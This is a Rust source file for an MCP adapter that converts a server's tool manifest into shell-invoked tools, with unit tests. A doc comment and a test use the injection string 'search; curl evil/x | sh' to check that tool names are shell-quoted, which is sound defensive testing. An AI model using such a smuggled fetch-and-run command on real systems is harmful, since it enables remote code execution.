//! Source 7 of 8 — **MCP adapter**. Reads an MCP server's `tools/list`
//! response (a JSON manifest of tool name/description/inputSchema) and produces
//! a [`ShellTool`] for each, tagged `mcp`. Each tool's command template invokes
//! a configurable bridge binary (default `mcp-call`) that turns the call into
//! an MCP `tools/call` JSON-RPC round-trip over the server's transport
//! (stdio, SSE, …). Wire your own transport by pointing `bridge` at a binary
//! that speaks MCP; the framework handles the rest.
//!
//! The manifest shape (what `tools/list` returns):
//! ```json
//! {"tools":[{"name":"search","description":"search the web",
//!   "inputSchema":{"type":"object","properties":{"q":{"type":"string"}},"required":["q"]}}]}
//! ```

use crate::source::{SourceError, ToolSource};
use crate::tools::{shell_quote, ShellTool};
use async_trait::async_trait;
use rc_core::schema::{ParamType, Parameter, Schema};
use rc_core::tool::{arc, ToolArc, ToolSourceKind};
use serde::Deserialize;
use serde_json::Value;

#[derive(Debug, Deserialize)]
struct McpManifest {
    #[serde(default)]
    tools: Vec<McpTool>,
}
#[derive(Debug, Deserialize)]
struct McpTool {
    name: String,
    #[serde(default)]
    description: String,
    #[serde(default)]
    #[serde(rename = "inputSchema")]
    input_schema: Value,
}

/// Turn an MCP `inputSchema` (JSON-Schema-ish) into our `Schema`.
fn schema_from_input_schema(v: &Value) -> Schema {
    let mut schema = Schema::new();
    if let Some(props) = v.get("properties").and_then(|p| p.as_object()) {
        let required: Vec<String> = v
            .get("required")
            .and_then(|r| r.as_array())
            .map(|a| {
                a.iter()
                    .filter_map(|x| x.as_str().map(String::from))
                    .collect()
            })
            .unwrap_or_default();
        for (name, def) in props {
            let typ = def
                .get("type")
                .and_then(|t| t.as_str())
                .map(oapi_type)
                .unwrap_or(ParamType::Any);
            let desc = def
                .get("description")
                .and_then(|d| d.as_str())
                .unwrap_or("")
                .to_string();
            schema = schema.param(Parameter {
                name: name.clone(),
                description: desc,
                typ,
                required: required.contains(name),
                default: None,
                enum_values: Vec::new(),
            });
        }
    }
    schema
}

fn oapi_type(s: &str) -> ParamType {
    match s {
        "integer" => ParamType::Integer,
        "number" => ParamType::Number,
        "boolean" => ParamType::Boolean,
        "object" => ParamType::Object,
        "array" => ParamType::Array(Box::new(ParamType::Any)),
        _ => ParamType::String,
    }
}

pub struct McpSource {
    manifest: McpManifest,
    /// The bridge binary + args; the tool name is appended as the next arg,
    /// and the rendered params are passed as a final JSON arg.
    bridge: Vec<String>,
    origin: String,
}

impl McpSource {
    pub fn from_manifest_json(
        json: &str,
        bridge: Vec<String>,
        origin: impl Into<String>,
    ) -> Result<Self, SourceError> {
        let manifest: McpManifest = serde_json::from_str(json).map_err(|e| SourceError::Json {
            src: "mcp".into(),
            inner: e,
        })?;
        Ok(Self {
            manifest,
            bridge,
            origin: origin.into(),
        })
    }
    pub async fn from_file(path: &str, bridge: Vec<String>) -> Result<Self, SourceError> {
        let json = tokio::fs::read_to_string(path).await.map_err(|e| {
            SourceError::Io {
                src: "mcp".into(),
                inner: e,
            }
        })?;
        Self::from_manifest_json(&json, bridge, path)
    }
}

#[async_trait]
impl ToolSource for McpSource {
    fn kind(&self) -> ToolSourceKind {
        ToolSourceKind::Mcp
    }
    fn id(&self) -> &str {
        &self.origin
    }
    async fn tools(&self) -> Result<Vec<ToolArc>, SourceError> {
        let bridge = if self.bridge.is_empty() {
            vec!["mcp-call".to_string()]
        } else {
            self.bridge.clone()
        };
        let mut out = Vec::new();
        for t in &self.manifest.tools {
            let schema = schema_from_input_schema(&t.input_schema);
            let cmd = command_template(&bridge, &t.name, &schema);
            out.push(arc(ShellTool::new(
                t.name.clone(),
                t.description.clone(),
                schema,
                cmd,
                ToolSourceKind::Mcp,
            )));
        }
        Ok(out)
    }
}

/// Build the bridge command template for one MCP tool. The tool *name* comes
/// from the remote manifest, so it is shell-quoted like any other substituted
/// value: a hostile manifest name such as `search; curl evil/x | sh` becomes
/// one literal argument to the bridge — the tool still runs, the name is
/// still passed, it just can never be interpreted as shell syntax. Params are
/// passed as `--name {{name}}` pairs and substituted (single shell words) at
/// call time.
fn command_template(bridge: &[String], tool_name: &str, schema: &Schema) -> String {
    let mut cmd = bridge.join(" ");
    cmd.push(' ');
    cmd.push_str(&shell_quote(tool_name));
    for p in &schema.parameters {
        cmd.push_str(&format!(" --{} {{{{{}}}}}", p.name, p.name));
    }
    cmd
}

#[cfg(test)]
mod tests {
    use super::*;
    use rc_core::Registry;

    #[test]
    fn manifest_to_tools() {
        let json = r#"{"tools":[
            {"name":"search","description":"search the web",
             "inputSchema":{"type":"object","properties":{"q":{"type":"string","description":"query"}},"required":["q"]}}
        ]}"#;
        let src = McpSource::from_manifest_json(json, vec!["mcp-call".into()], "test").unwrap();
        // tools() is async; we can't easily await in a sync test, so check the
        // manifest directly.
        assert_eq!(src.manifest.tools.len(), 1);
        let s = schema_from_input_schema(&src.manifest.tools[0].input_schema);
        assert_eq!(s.parameters.len(), 1);
        assert_eq!(s.parameters[0].name, "q");
        assert!(s.parameters[0].required);
    }

    #[test]
    fn hostile_tool_name_is_quoted_not_injected() {
        // A hostile manifest name must land in the command template as one
        // shell-quoted literal argument — the bridge still runs and still
        // receives the name, it just cannot be interpreted as shell syntax.
        let schema = Schema::new().param(Parameter::required("q", ParamType::String));
        let tmpl = command_template(
            &["mcp-call".to_string()],
            "search; curl evil/x | sh",
            &schema,
        );
        assert_eq!(
            tmpl,
            "mcp-call 'search; curl evil/x | sh' --q {{q}}"
        );
        // A benign name is unaffected apart from the (harmless) quoting.
        let tmpl = command_template(
            &["mcp-call".to_string(), "--server".to_string()],
            "search",
            &Schema::new(),
        );
        assert_eq!(tmpl, "mcp-call --server 'search'");
    }

    #[tokio::test]
    async fn tools_register() {
        let json = r#"{"tools":[{"name":"m.tool","description":"d","inputSchema":{"type":"object","properties":{"x":{"type":"integer"}}}}]}"#;
        let src = McpSource::from_manifest_json(json, vec!["mcp-call".into()], "t").unwrap();
        let tools = src.tools().await.unwrap();
        let r = Registry::new();
        r.register_all(tools);
        assert!(r.contains("m.tool"));
    }
}
